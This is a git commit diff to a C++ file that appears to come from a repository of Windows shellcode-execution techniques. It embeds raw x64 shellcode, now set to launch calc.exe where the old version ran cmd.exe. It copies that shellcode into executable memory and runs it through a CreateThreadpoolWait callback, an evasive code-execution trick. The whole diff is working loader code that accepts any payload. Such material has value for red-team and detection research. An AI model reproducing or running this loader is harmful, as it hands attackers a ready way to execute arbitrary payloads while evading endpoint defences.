964a6cfdb8583fa6f0f1c1dc34beda04cac25fd3
S4R1N <s4r1n97@gmail.com>
2021-03-01 18:37:36 -0500

    removed faulty functions

--- CreateThreadPoolWait/CreateThreadPoolWait.cpp
+++ CreateThreadPoolWait/CreateThreadPoolWait.cpp
@@ -1,11 +1,11 @@
-#include <windows.h>
+﻿#include <windows.h>
+#include <stdio.h>
 #include <threadpoolapiset.h>
 
-/*
-* Credit goes to alfarom256 for finding this!
-*/
+#define LEN 277
 
-unsigned char shellcode[] =
+// run calc
+unsigned char op[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
 "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
@@ -21,21 +21,43 @@ unsigned char shellcode[] =
 "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
 "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
 "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
-"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
 "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
-"\x2e\x65\x78\x65\x00";
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00";
 
 
 int main()
 {
-	HANDLE event = ::CreateEvent(NULL, FALSE, TRUE, NULL);
-	LPVOID shellcodeAddress = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	::RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
+	HANDLE hEvent;
+	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 
-	PTP_WAIT threadPoolWait = ::CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
-	::SetThreadpoolWait(threadPoolWait, event, NULL);
-	::WaitForSingleObject(event, INFINITE);
 
-	return 0;
+
+	/*
+	Can just shove a payload in RX mem and cast it to PTP_WAIT_CALLBACK
+	¯\_(ツ)_/¯
+	*/
+
+	LPVOID addr = VirtualAlloc(NULL, LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	RtlMoveMemory(addr, op, LEN);
+	DWORD old;
+
+
+	if (!VirtualProtect(addr, LEN, PAGE_EXECUTE_READ, &old))
+		printf("%d", GetLastError());
+
+	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)addr, NULL, NULL);
+
+
+	SetThreadpoolWait(ptp_w, hEvent, 0);
+
+	// need to send events so the Threadpool Wait Callback has a chance to "catch" them and run
+	SetEvent(hEvent);
+	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
+	SetEvent(hEvent);
+	while (TRUE)
+	{
+		Sleep(9000);
+	}
 }
